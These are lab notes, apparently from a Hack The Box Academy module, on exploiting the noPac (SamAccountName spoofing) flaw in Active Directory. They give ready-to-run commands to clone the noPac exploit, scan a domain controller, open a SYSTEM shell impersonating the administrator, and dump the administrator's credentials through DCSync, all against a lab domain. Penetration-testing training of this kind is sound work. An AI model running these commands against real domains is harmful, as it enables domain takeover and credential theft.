
## NoPac (SamAccountName Spoofing)

A great example of an emerging threat is the [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing`

This exploit path takes advantage of being able to change the `SamAccountName` of a computer account to that of a Domain Controller. By default, authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain).

NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed. We can use these commands to do so:

#### Ensuring Impacket is Installed

	AstraX01@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git

	AstraX01@htb[/htb]$ python setup.py install

#### Cloning the NoPac Exploit Repo

	AstraX01@htb[/htb]$ git clone https://github.com/Ridter/noPac.git

#### Scanning for NoPac

	AstraX01@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller.

#### Running NoPac & Getting a Shell

	AstraX01@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.

#### Confirming the Location of Saved Tickets

	AstraX01@htb[/htb]$ ls

We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py

#### Using noPac to DCSync the Built-in Administrator Account

	AstraX01@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator


